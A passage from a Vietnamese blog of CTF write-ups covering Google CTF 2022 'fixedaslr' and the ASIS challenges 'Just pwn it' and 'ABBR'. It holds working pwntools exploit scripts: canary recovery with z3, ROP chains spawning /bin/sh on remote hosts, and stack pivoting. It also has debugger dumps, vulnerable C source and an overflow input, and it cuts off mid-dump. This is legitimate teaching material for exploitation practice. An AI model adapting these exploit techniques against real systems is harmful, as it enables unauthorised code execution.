0xe5894855fa1e0ff3 0x00009580000040│+0x0040: 0xcccc0000000225ff 0x00009580000048│+0x0048: 0x00004080001000 → 0xe5894855fa1e0ff3 Cứ tiếp tục làm như vậy thì ta có thể leak được 6 base address của các file object (main.o, syscalls.o, guard.o, basic.o, game.o, res.o). Vậy làm sao để có được địa chỉ base address thứ 7 (debug.o)? Well, here comes some crypto magic from my teammate. Đồng đội mình đã giúp mình recover lại canary và tìm luôn địa chỉ của debug.o. Chút nữa mình sẽ để trong script solve cuối cùng.\nRopchain Sau khi có được canary và địa chỉ debug.o thì mọi thứ đã trở nên đơn giản. Mình sẽ build 1 ropchain execve(\u0026quot;/bin/sh\u0026quot;, 0, 0) để spawn shell. Các gadgets cần thiết thì đã có trong vùng address của debug.o.\ngef➤ x/40i 0x0000e3e0000000+0x1000 0xe3e0001000:\tpush rdi 0xe3e0001001:\tpop rdi 0xe3e0001002:\tret 0xe3e0001003:\tpush rdi 0xe3e0001004:\tpop rsi 0xe3e0001005:\tret 0xe3e0001006:\tpush rdi 0xe3e0001007:\tpop rax 0xe3e0001008:\tret 0xe3e0001009:\tpush rdi 0xe3e000100a:\tpop rbx 0xe3e000100b:\tret 0xe3e000100c:\tpush rdi 0xe3e000100d:\tpop rcx 0xe3e000100e:\tret 0xe3e000100f:\tpush rdi 0xe3e0001010:\tpop rdx 0xe3e0001011:\tret 0xe3e0001012:\tpush rdi 0xe3e0001013:\tpop rsp 0xe3e0001014:\tret 0xe3e0001015:\tpush rdi 0xe3e0001016:\tpop rbp 0xe3e0001017:\tret 0xe3e0001018:\tpush rdi 0xe3e0001019:\tpop r8 0xe3e000101b:\tret 0xe3e000101c:\tpush rdi 0xe3e000101d:\tpop r9 0xe3e000101f:\tret 0xe3e0001020:\tpush rdi 0xe3e0001021:\tpop r10 0xe3e0001023:\tret 0xe3e0001024:\tpush rdi 0xe3e0001025:\tpop r11 0xe3e0001027:\tret 0xe3e0001028:\tpush rdi 0xe3e0001029:\tpop r12 0xe3e000102b:\tret 0xe3e000102c:\tpush rdi Final script from pwn import * # p = process(\u0026#39;./loader\u0026#39;) p = remote(\u0026#39;fixedaslr.2022.ctfcompetition.com\u0026#39;, 1337) def get_addr(idx): p.recv() p.sendline(b\u0026#39;3\u0026#39;) p.recv() p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;: \u0026#39;) return int(p.recvline()[:-1]) def get_index(start): return ((start - game_score_board_addr) \u0026amp; 0xffffffffffffffff) // 8 main_o = get_addr(512) - 0x60 - 0x2000 game_score_board_addr = main_o + 0x2000 idx = get_index(main_o + 0x8) game_o = get_addr(idx) - 0x1111 idx = get_index(main_o + 0x38) guard_o = get_addr(idx) - 0x1000 idx = get_index(game_o + 0x8) basic_o = get_addr(idx) - 0x119c idx = get_index(guard_o + 0x8) syscalls_o = get_addr(idx) - 0x1064 idx = get_index(game_o + 0x2000) res_o = get_addr(idx) - 0x1000 log.info(\u0026#39;main.o : \u0026#39; + hex(main_o)) log.info(\u0026#39;syscalls.o : \u0026#39; + hex(syscalls_o)) log.info(\u0026#39;guard.o : \u0026#39; + hex(guard_o)) log.info(\u0026#39;basic.o : \u0026#39; + hex(basic_o)) log.info(\u0026#39;game.o : \u0026#39; + hex(game_o)) log.info(\u0026#39;res.o : \u0026#39; + hex(res_o)) known_states = [main_o \u0026gt;\u0026gt; 28, syscalls_o \u0026gt;\u0026gt; 28, guard_o \u0026gt;\u0026gt; 28, basic_o \u0026gt;\u0026gt; 28, game_o \u0026gt;\u0026gt; 28, res_o \u0026gt;\u0026gt; 28] from z3 import * s = Solver() log.info(f\u0026#39;Known states: {known_states}\u0026#39;) rand_state = BitVec(\u0026#34;x\u0026#34;, 64) def rand_extract_bit(a): global rand_state return (rand_state \u0026gt;\u0026gt; a) \u0026amp; 1 def rand_get_bit(): global rand_state x = ( rand_extract_bit(0x3F) ^ rand_extract_bit(0x3D) ^ rand_extract_bit(0x3C) ^ rand_extract_bit(0x3A) ^ 1 ) rand_state = ((rand_state \u0026lt;\u0026lt; 1) % (2**64)) | x return x def rand(n): x = 0 for i in range(n): y = rand_get_bit() x = (x \u0026lt;\u0026lt; 1) | y return x for known_state in known_states: s.add(rand(12) == known_state) recovered_canary = 0 if s.check() == sat: model = s.model() recovered_canary = model[BitVec(\u0026#34;x\u0026#34;, 64)].as_long() log.info(\u0026#39;Recovered canary: \u0026#39; + hex(recovered_canary)) rand_state = recovered_canary debug_o = 0 for i in range(7): debug_o = rand(12) debug_o = debug_o \u0026lt;\u0026lt; 28 log.info(\u0026#39;debug.o : \u0026#39; + hex(debug_o)) p.recv() p.sendline(b\u0026#39;1\u0026#39;) for i in range(12): p.recvuntil(b\u0026#39;How much is \u0026#39;) equation = p.recvline()[:-3] res = eval(equation) p.sendline(str(res).encode()) p.sendline(b\u0026#39;0\u0026#39;) p.recv() p.sendline(b\u0026#39;1000\u0026#39;) pop_rsi = debug_o + 0x1004 pop_rdx = debug_o + 0x1010 pop_rax = debug_o + 0x1007 syscall = syscalls_o + 0x1002 payload = b\u0026#39;/bin/sh\u0026#39; payload = payload.ljust(0x28, b\u0026#39;\\x00\u0026#39;) payload += p64(recovered_canary) payload += b\u0026#39;a\u0026#39;*8 payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.recv() p.sendline(payload) p.recvrepeat(0.5) p.interactive() pi@vik: ~/CTF/google_ctf/fixedaslr $ python3 solve.py [+] Opening connection to fixedaslr.2022.ctfcompetition.com on port 1337: Done [*] main.o : 0x1640000000 [*] syscalls.o : 0x2c40000000 [*] guard.o : 0x5d40000000 [*] basic.o : 0x72f0000000 [*] game.o : 0xcc0000000 [*] res.o : 0xeca0000000 [*] Known states: [356, 708, 1492, 1839, 204, 3786] [*] Recovered canary: 0xc12b162013d71ab7 [*] debug.o : 0xf880000000 [*] Switching to interactive mode $ id uid=1000(user) gid=1000(user) groups=1000(user) $ ls -la total 64 drwxr-xr-x 2 nobody nogroup 4096 Jul 2 05:52 . drwxr-xr-x 3 nobody nogroup 4096 Jul 2 05:52 .. -rw-r--r-- 1 nobody nogroup 5040 Jul 1 21:48 basic.o -rw-r--r-- 1 nobody nogroup 1664 Jul 1 21:48 debug.o -rw-r--r-- 1 nobody nogroup 46 Jul 1 21:48 flag -rw-r--r-- 1 nobody nogroup 7280 Jul 1 21:48 game.o -rw-r--r-- 1 nobody nogroup 1416 Jul 1 21:48 guard.o -rwxr-xr-x 1 nobody nogroup 15376 Jul 1 21:48 loader -rw-r--r-- 1 nobody nogroup 2088 Jul 1 21:48 main.o -rw-r--r-- 1 nobody nogroup 1184 Jul 1 21:48 res.o -rw-r--r-- 1 nobody nogroup 3056 Jul 1 21:48 syscalls.o $ cat flag CTF{GuessYouCanSayTheCookieGotRandomlyBroken} $ [*] Interrupted [*] Closed connection to fixedaslr.2022.ctfcompetition.com port 1337 ","permalink":"https://pivik271.github.io/posts/googlectf2022/","summary":"Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.\nCác binary với solve script mình sẽ để ở đây.\nMadcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn \u0026hellip;","title":"Google CTF - Madcore, Fixedaslr"},{"content":"Cuối tuần rồi mình có chơi giải ASIS cùng với ae team Underrated, và được vào chung kết rồi nè 🥰\nMình giải các challenge pwn là chủ yếu và làm được 3 bài. Các challenge giải này theo mình đánh giá là khá hay. Các binary với solve script mình sẽ để ở đây.\nJust pwn it: Category: pwn Points: 51 Solves: 106 Description: Just Pwn It! Nothing else!! Source code overview Tác giả cho luôn source, vậy cùng xem qua nào!\n/* * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define STR_SIZE 0x80 void set_element(char **parray) { int index; printf(\u0026#34;Index: \u0026#34;); if (scanf(\u0026#34;%d%*c\u0026#34;, \u0026amp;index) != 1)\t// [1] exit(1); if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE))) exit(1); printf(\u0026#34;Data: \u0026#34;); if (!fgets(parray[index], STR_SIZE, stdin)) exit(1); } void justpwnit() { char *array[4]; for (int i = 0; i \u0026lt; 4; i++) { set_element(array); } } int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); alarm(180); justpwnit(); return 0; } Không có gì nhiều, khá ngắn gọn.\nSolution Sau khi nhập index ở [1] xong thì chương trình không check boundary nên sẽ dẫn đến lỗi out-of-bounds. Phần buffer mình nhập không nằm trên stack mà nằm trên vùng memory được trả về bởi calloc(). Vậy để điều khiển được flow của chương trình thì mình sẽ dùng kỹ thuật stack pivot. Xem qua stack khi vào hàm set_element():\n*RBP 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1 *RSP 0x7fffffffde90 ◂— 0x0 *RIP 0x401193 (set_element+90) ◂— lea rbx, [rdx + rax] ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x401176 \u0026lt;set_element+61\u0026gt; je set_element+73 \u0026lt;set_element+73\u0026gt; ↓ 0x401182 \u0026lt;set_element+73\u0026gt; mov eax, dword ptr [rbp - 0x14] 0x401185 \u0026lt;set_element+76\u0026gt; cdqe 0x401187 \u0026lt;set_element+78\u0026gt; lea rdx, [rax*8] 0x40118f \u0026lt;set_element+86\u0026gt; mov rax, qword ptr [rbp - 0x28] ► 0x401193 \u0026lt;set_element+90\u0026gt; lea rbx, [rdx + rax] \u0026lt;0x40123d\u0026gt; 0x401197 \u0026lt;set_element+94\u0026gt; mov esi, 0x80 0x40119c \u0026lt;set_element+99\u0026gt; mov edi, 1 0x4011a1 \u0026lt;set_element+104\u0026gt; call calloc \u0026lt;calloc\u0026gt; 0x4011a6 \u0026lt;set_element+109\u0026gt; mov qword ptr [rbx], rax 0x4011a9 \u0026lt;set_element+112\u0026gt; mov rax, qword ptr [rbx] ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* \u0026#39;?=@\u0026#39; */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbp 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x401193 set_element+90 f 1 0x40122f justpwnit+33 f 2 0x401295 main+88 f 3 0x40147c libc_start_main_stage2+43 f 4 0x401451 libc_start_main_stage2 f 5 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; telescope 40 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* \u0026#39;?=@\u0026#39; */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbp 0x7fffffffdec0 —▸ 0x7fffffffdf00 —▸ 0x7fffffffdf10 ◂— 0x1 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 08:0040│ rax 0x7fffffffded0 ◂— 0xb4 09:0048│ 0x7fffffffded8 ◂— 0x0 Base address của array là 0x7fffffffded0, và giá trị của rbp là 0x7fffffffdec0. Vậy nếu mình nhập -2 vào index thì địa chỉ chứa ở rbp sẽ trỏ tới buffer của mình.\nRBP 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; RSP 0x7fffffffde90 ◂— 0x0 *RIP 0x4011f7 (set_element+190) ◂— test rax, rax ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x4011e4 \u0026lt;set_element+171\u0026gt; add rax, rcx 0x4011e7 \u0026lt;set_element+174\u0026gt; mov rax, qword ptr [rax] 0x4011ea \u0026lt;set_element+177\u0026gt; mov esi, 0x80 0x4011ef \u0026lt;set_element+182\u0026gt; mov rdi, rax 0x4011f2 \u0026lt;set_element+185\u0026gt; call fgets_unlocked \u0026lt;fgets_unlocked\u0026gt; ► 0x4011f7 \u0026lt;set_element+190\u0026gt; test rax, rax 0x4011fa \u0026lt;set_element+193\u0026gt; jne set_element+205 \u0026lt;set_element+205\u0026gt; ↓ 0x401206 \u0026lt;set_element+205\u0026gt; nop 0x401207 \u0026lt;set_element+206\u0026gt; add rsp, 0x28 0x40120b \u0026lt;set_element+210\u0026gt; pop rbx 0x40120c \u0026lt;set_element+211\u0026gt; pop rbp ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* \u0026#39;?=@\u0026#39; */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbx rbp 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x4011f7 set_element+190 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; telescope 40 00:0000│ rsp 0x7fffffffde90 ◂— 0x0 01:0008│ 0x7fffffffde98 —▸ 0x7fffffffded0 ◂— 0xb4 02:0010│ 0x7fffffffdea0 ◂— 0x0 03:0018│ 0x7fffffffdea8 ◂— 0xfffffffe00403d3f /* \u0026#39;?=@\u0026#39; */ 04:0020│ 0x7fffffffdeb0 ◂— 0x0 05:0028│ 0x7fffffffdeb8 —▸ 0x40123d (main) ◂— endbr64 06:0030│ rbx rbp 0x7fffffffdec0 —▸ 0x7ffff7ff8050 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; 07:0038│ 0x7fffffffdec8 —▸ 0x40122f (justpwnit+33) ◂— add dword ptr [rbp - 4], 1 08:0040│ 0x7fffffffded0 ◂— 0xb4 09:0048│ 0x7fffffffded8 ◂— 0x0 Sau khi thực hiện instruction pop rbp ở cuối hàm set_element():\n0x40120c \u0026lt;set_element+211\u0026gt; pop rbp và leave ; ret ở cuối hàm justpwnit():\n0x40123b \u0026lt;justpwnit+45\u0026gt; leave 0x40123c \u0026lt;justpwnit+46\u0026gt; ret thì mình sẽ pivot được stack lên vùng buffer mà mình control.\n*RBP 0x6161616161616161 (\u0026#39;aaaaaaaa\u0026#39;) *RSP 0x7ffff7ff8058 ◂— \u0026#39;bbbbbbbb\\n\u0026#39; *RIP 0x40123c (justpwnit+46) ◂— ret ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 0x401233 \u0026lt;justpwnit+37\u0026gt; cmp dword ptr [rbp - 4], 3 0x401237 \u0026lt;justpwnit+41\u0026gt; jle justpwnit+21 \u0026lt;justpwnit+21\u0026gt; 0x401239 \u0026lt;justpwnit+43\u0026gt; nop 0x40123a \u0026lt;justpwnit+44\u0026gt; nop 0x40123b \u0026lt;justpwnit+45\u0026gt; leave ► 0x40123c \u0026lt;justpwnit+46\u0026gt; ret \u0026lt;0x6262626262626262\u0026gt; ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffff7ff8058 ◂— \u0026#39;bbbbbbbb\\n\u0026#39; 01:0008│ rdx-1 0x7ffff7ff8060 ◂— 0xa /* \u0026#39;\\n\u0026#39; */ 02:0010│ 0x7ffff7ff8068 ◂— 0x0 ... ↓ 5 skipped ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ► f 0 0x40123c justpwnit+46 f 1 0x6262626262626262 f 2 0xa f 3 0x0 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; Final script from pwn import * # p = elf.process() p = remote(\u0026#39;168.119.108.148\u0026#39;, 11010) pop_rdi = 0x0000000000401b0d mov = 0x406c3d\t# mov qword ptr [rdi], rsi ; ret pop_rsi = 0x4019a3 data_seg = 0x0040c120 pop_rax = 0x401001 syscall = 0x4013e9 pop_rdx = 0x403d23 p.recv() p.sendline(b\u0026#39;-2\u0026#39;) p.recv() payload = b\u0026#39;a\u0026#39;*8 payload += p64(pop_rdi) payload += p64(data_seg) payload += p64(pop_rsi) payload += b\u0026#39;/bin/sh\\x00\u0026#39; payload += p64(mov) payload += p64(pop_rdi) payload += p64(data_seg) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.sendline(payload) p.interactive() [+] Opening connection to 168.119.108.148 on port 11010: Done [*] Switching to interactive mode $ id uid=999(pwn) gid=999(pwn) groups=999(pwn) $ ls chall flag-69a1f60d8055c88ea27fed1ab926b2b6.txt $ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?} Hihi first blood.\nABBR: Category: pwn Points: 71 Solves: 68 Description: Abbreviations in English are complicated\u0026hellip; Why? Source code overview #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026#34;rules.h\u0026#34; typedef struct Translator { void (*translate)(char*); char *text; int size; } Translator; void english_expand(char *text) { int i, alen, blen; Rule *r; char *p, *q; char *end = \u0026amp;text[strlen(text)-1]; // pointer to the last character /* Replace all abbreviations */ for (p = text; *p; ++p) {\t// [3] for (i = 0; i \u0026lt; sizeof(rules) / sizeof(Rule); i++) { r = \u0026amp;rules[i]; alen = strlen(r-\u0026gt;a); blen = strlen(r-\u0026gt;b); if (strncasecmp(p, r-\u0026gt;a, alen) == 0) { // i.e \u0026#34;i\u0026#39;m pwn noob.\u0026#34; --\u0026gt; \u0026#34;i\u0026#39;m pwn XXnoob.\u0026#34; for (q = end; q \u0026gt; p; --q) *(q+blen-alen) = *q; // Update end end += blen-alen; *(end+1) = \u0026#39;\\0\u0026#39;; // i.e \u0026#34;i\u0026#39;m pwn XXnoob.\u0026#34; --\u0026gt; \u0026#34;i\u0026#39;m pwn newbie.\u0026#34; memcpy(p, r-\u0026gt;b, blen); } } } } Translator *translator_new(int size) { Translator *t; /* Allocate region for text */ char *text = (char*)calloc(sizeof(char), size); if (text == NULL) return NULL; /* Initialize translator */ t = (Translator*)malloc(sizeof(Translator)); t-\u0026gt;text = text; t-\u0026gt;size = size; t-\u0026gt;translate = english_expand; return t; } void translator_reset(Translator *t) { memset(t-\u0026gt;text, 0, t-\u0026gt;size); } int main() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); alarm(60); Translator *t = translator_new(0x1000); while (1) { /* Input data */ translator_reset(t); printf(\u0026#34;Enter text: \u0026#34;); fgets(t-\u0026gt;text, t-\u0026gt;size, stdin);\t// [2] if (t-\u0026gt;text[0] == \u0026#39;\\n\u0026#39;) break; /* Expand abbreviation */ t-\u0026gt;translate(t-\u0026gt;text); printf(\u0026#34;Result: %s\u0026#34;, t-\u0026gt;text); } return 0; } Chương trình sẽ thay thế những chữ viết tắt (abbr) thành những chữ dài hơn (expanded). Dưới đây là những chữ đó:\ntypedef struct { char *a; // abbreviated string (i.e \u0026#34;asap\u0026#34;) char *b; // expanded string (i.e \u0026#34;as soon as possible\u0026#34;) } Rule; // Why are there so many abbreviations in English!!?? :exploding_head: Rule rules[] = { {.a=\u0026#34;2f4u\u0026#34;, .b=\u0026#34;too fast for you\u0026#34;}, {.a=\u0026#34;4yeo\u0026#34;, .b=\u0026#34;for your eyes only\u0026#34;}, {.a=\u0026#34;fyeo\u0026#34;, .b=\u0026#34;for your eyes only\u0026#34;}, {.a=\u0026#34;aamof\u0026#34;, .b=\u0026#34;as a matter of fact\u0026#34;}, {.a=\u0026#34;afaik\u0026#34;, .b=\u0026#34;as far as i know\u0026#34;}, {.a=\u0026#34;afk\u0026#34;, .b=\u0026#34;away from keyboard\u0026#34;}, {.a=\u0026#34;aka\u0026#34;, .b=\u0026#34;also known as\u0026#34;}, {.a=\u0026#34;b2k\u0026#34;, .b=\u0026#34;back to keyboard\u0026#34;}, {.a=\u0026#34;btk\u0026#34;, .b=\u0026#34;back to keyboard\u0026#34;}, {.a=\u0026#34;btt\u0026#34;, .b=\u0026#34;back to topic\u0026#34;}, {.a=\u0026#34;btw\u0026#34;, .b=\u0026#34;by the way\u0026#34;}, {.a=\u0026#34;b/c\u0026#34;, .b=\u0026#34;because\u0026#34;}, {.a=\u0026#34;c\u0026amp;p\u0026#34;, .b=\u0026#34;copy and paste\u0026#34;}, {.a=\u0026#34;cys\u0026#34;, .b=\u0026#34;check your settings\u0026#34;}, {.a=\u0026#34;diy\u0026#34;, .b=\u0026#34;do it yourself\u0026#34;}, {.a=\u0026#34;eobd\u0026#34;, .b=\u0026#34;end of business day\u0026#34;}, {.a=\u0026#34;faq\u0026#34;, .b=\u0026#34;frequently asked questions\u0026#34;}, {.a=\u0026#34;fka\u0026#34;, .b=\u0026#34;formerly known as\u0026#34;}, {.a=\u0026#34;fwiw\u0026#34;, .b=\u0026#34;for what it\u0026#39;s worth\u0026#34;}, {.a=\u0026#34;fyi\u0026#34;, .b=\u0026#34;for your information\u0026#34;}, {.a=\u0026#34;jfyi\u0026#34;, .b=\u0026#34;just for your information\u0026#34;}, {.a=\u0026#34;hf\u0026#34;, .b=\u0026#34;have fun\u0026#34;}, {.a=\u0026#34;hth\u0026#34;, .b=\u0026#34;hope this helps\u0026#34;}, {.a=\u0026#34;idk\u0026#34;, .b=\u0026#34;i don\u0026#39;t know\u0026#34;}, {.a=\u0026#34;iirc\u0026#34;, .b=\u0026#34;if i remember correctly\u0026#34;}, {.a=\u0026#34;imho\u0026#34;, .b=\u0026#34;in my humble opinion\u0026#34;}, {.a=\u0026#34;imo\u0026#34;, .b=\u0026#34;in my opinion\u0026#34;}, {.a=\u0026#34;imnsho\u0026#34;, .b=\u0026#34;in my not so humble opinion\u0026#34;}, {.a=\u0026#34;iow\u0026#34;, .b=\u0026#34;in other words\u0026#34;}, {.a=\u0026#34;itt\u0026#34;, .b=\u0026#34;in this thread\u0026#34;}, {.a=\u0026#34;dgmw\u0026#34;, .b=\u0026#34;don\u0026#39;t get me wrong\u0026#34;}, {.a=\u0026#34;mmw\u0026#34;, .b=\u0026#34;mark my words\u0026#34;}, {.a=\u0026#34;nntr\u0026#34;, .b=\u0026#34;no need to reply\u0026#34;}, {.a=\u0026#34;noob\u0026#34;, .b=\u0026#34;newbie\u0026#34;}, {.a=\u0026#34;noyb\u0026#34;, .b=\u0026#34;none of your business\u0026#34;}, {.a=\u0026#34;nrn\u0026#34;, .b=\u0026#34;no reply necessary\u0026#34;}, {.a=\u0026#34;otoh\u0026#34;, .b=\u0026#34;on the other hand\u0026#34;}, {.a=\u0026#34;rtfm\u0026#34;, .b=\u0026#34;read the fine manual\u0026#34;}, {.a=\u0026#34;scnr\u0026#34;, .b=\u0026#34;sorry, could not resist\u0026#34;}, {.a=\u0026#34;sflr\u0026#34;, .b=\u0026#34;sorry for late reply\u0026#34;}, {.a=\u0026#34;tba\u0026#34;, .b=\u0026#34;to be announced\u0026#34;}, {.a=\u0026#34;tbc\u0026#34;, .b=\u0026#34;to be continued\u0026#34;}, {.a=\u0026#34;tia\u0026#34;, .b=\u0026#34;thanks in advance\u0026#34;}, {.a=\u0026#34;tq\u0026#34;, .b=\u0026#34;thank you\u0026#34;}, {.a=\u0026#34;tyvm\u0026#34;, .b=\u0026#34;thank you very much\u0026#34;}, {.a=\u0026#34;tyt\u0026#34;, .b=\u0026#34;take your time\u0026#34;}, {.a=\u0026#34;ttyl\u0026#34;, .b=\u0026#34;talk to you later\u0026#34;}, {.a=\u0026#34;wfm\u0026#34;, .b=\u0026#34;works for me\u0026#34;}, {.a=\u0026#34;wtf\u0026#34;, .b=\u0026#34;what the fuck\u0026#34;}, {.a=\u0026#34;wrt\u0026#34;, .b=\u0026#34;with regard to\u0026#34;}, {.a=\u0026#34;ymmd\u0026#34;, .b=\u0026#34;you made my day\u0026#34;}, {.a=\u0026#34;icymi\u0026#34;, .b=\u0026#34;in case you missed it\u0026#34;}, // pwners abbreviations {.a=\u0026#34;rop \u0026#34;, .b=\u0026#34;return oriented programming \u0026#34;}, {.a=\u0026#34;jop \u0026#34;, .b=\u0026#34;jump oriented programming \u0026#34;}, {.a=\u0026#34;cop \u0026#34;, .b=\u0026#34;call oriented programming \u0026#34;}, {.a=\u0026#34;aar\u0026#34;, .b=\u0026#34;arbitrary address read\u0026#34;}, {.a=\u0026#34;aaw\u0026#34;, .b=\u0026#34;arbitrary address write\u0026#34;}, {.a=\u0026#34;www\u0026#34;, .b=\u0026#34;write what where\u0026#34;}, {.a=\u0026#34;oob\u0026#34;, .b=\u0026#34;out of bounds\u0026#34;}, {.a=\u0026#34;ret2\u0026#34;, .b=\u0026#34;return to \u0026#34;}, }; Solution Lúc đầu nhìn sơ qua thì mình không thấy bug, nhưng khi để ý kỹ lại thì ở khi nhập input cho t-text ở [2], nếu mình nhập 1 lượng lớn abbr thì phần buffer sẽ sẽ bị tràn do mình chỉ có thể thoát được vòng lặp for ở [3] khi gặp null byte, và không có đoạn nào check phần data của buffer có trở nên lớn hơn do các chữ expanded không. Các bạn xem ví dụ dưới đây để dễ hình dung:\n$ ./abbr Enter text: imnsho Result: in my not so humble opinion Enter text: imnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnshoimnsho Segmentation fault (core dumped) Với lỗi này thì mình có thể overwrite được t-\u0026gt;translate thành 1 địa chỉ khác. Trong lúc giải đang diễn ra thì mình giải theo hướng overwrite t-\u0026gt;translate thành printf() để thực hiện format string. Leak heap, pivot stack lên heap rồi build rop chain (các bạn tham khảo solve script của mình tại đây). Nhưng cách này khá dài dòng và rắc rối nên mình sẽ trình bày theo intended solution mà mình có tham khảo writeup của tác giả và làm lại sau khi kết thúc giải.\nRAX 0x214cb90 ◂— \u0026#39;aaaaaaaabbbbbbbb\\n\u0026#39; RBX 0x400530 ◂— 0x0 *RCX 0x459e62 (read+18) ◂— cmp rax, -0x1000 /* \u0026#39;H=\u0026#39; */ *RDX 0x0 *RDI 0x4cc020 (_IO_stdfile_0_lock) ◂— 0x0 *RSI 0x4c9943 